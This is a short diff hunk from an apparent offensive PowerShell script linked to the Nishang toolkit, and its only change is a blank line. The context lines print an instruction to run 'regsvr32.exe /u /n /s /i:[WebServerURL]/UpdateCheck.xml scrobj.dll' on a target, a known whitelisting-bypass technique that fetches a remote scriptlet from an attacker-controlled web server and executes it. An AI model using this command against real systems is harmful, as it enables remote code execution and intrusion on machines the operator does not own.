@@ -115,3 +115,4 @@ https://github.com/samratashok/nishang
     Write-Output "Run the following command on the target:"
     Write-Output "regsvr32.exe /u /n /s /i:[WebServerURL]/UpdateCheck.xml scrobj.dll"
 }
+
